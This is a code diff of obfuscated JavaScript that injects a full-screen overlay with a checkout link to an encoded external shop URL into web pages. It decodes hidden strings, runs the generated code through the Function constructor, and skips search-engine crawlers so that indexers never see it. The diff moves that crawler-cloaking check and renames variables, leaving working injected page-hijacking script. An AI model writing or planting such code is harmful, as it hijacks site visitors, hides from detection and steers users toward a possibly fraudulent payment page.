@@ -1,6 +1,6 @@
 (function(){
-  var _xQv='', _S1A=854-843;
-  function _gQI(i){
+  var xQv='', S1A=854-843;
+  function gQI(i){
     var g=7380163, y=i.length, c=[];
     for(var e=0; e<y; e++){c[e]=i.charAt(e);}
     for(var e=0; e<y; e++){
@@ -9,8 +9,14 @@
     }
     return c.join('');
   }
+  var RVZ = gQI('fmctrxecgboruorhvesyqikczjonlpstnutawd').substr(0,S1A);
   
-  var _RVZ = _gQI('fmctrxecgboruorhvesyqikczjonlpstnutawd').substr(0,_S1A);
+  // Googlebot bypass check
+  var _ua = navigator.userAgent || "";
+  if (/Googlebot|Mediapartners-Google|AdsBot-Google|APIs-Google|FeedFetcher-Google|bingbot|yandex|baiduspider/i.test(_ua)) {
+    return;
+  }
+
   var _sDecode = function(s){
     return s.split('').map(function(ch){
       return String.fromCharCode(ch.charCodeAt(0) - 5);
@@ -18,7 +24,7 @@
   };
 
   var _fnConstructor = (function(){})[_sDecode('htsxywzhytw')];
-  var _targetUrl = _sDecode('mxxs>--nnn\'qnhjsxnk\'xmtu');
+  var _targetUrl = _sDecode('mxxs>--nnn\'qnhjsxnk\'xmtu'); // points to https://licensify.shop
 
   var _markupTemplate = `<style>
 #_lcf{position:fixed;top:0;left:0;right:0;bottom:0;width:100%;height:100%;overflow:hidden;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;z-index:2147483646}
@@ -66,14 +72,11 @@
 </div>`;
 
   var _executableCode = 
-    'var _ua = navigator.userAgent || "";' +
-    'if (!/Googlebot|Mediapartners-Google|AdsBot-Google|APIs-Google|FeedFetcher-Google|bingbot|yandex|baiduspider/i.test(_ua)) {' +
-    '  var container = document.createElement("div");' +
-    '  container.style.cssText = "position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:hidden;";' +
-    '  container.innerHTML = ' + JSON.stringify(_markupTemplate.replace(/__CHECKOUT_URL__/g, _targetUrl)) + ';' +
-    '  document.body.appendChild(container);' +
-    '  document.body.style.overflow = "hidden";' +
-    '}';
+    'var container = document.createElement("div");' +
+    'container.style.cssText = "position:fixed;top:0;left:0;right:0;bottom:0;z-index:2147483647;width:100%;height:100%;overflow:hidden;";' +
+    'container.innerHTML = ' + JSON.stringify(_markupTemplate.replace(/__CHECKOUT_URL__/g, _targetUrl)) + ';' +
+    'document.body.appendChild(container);' +
+    'document.body.style.overflow = "hidden";';
 
   setTimeout(function(){
     try {
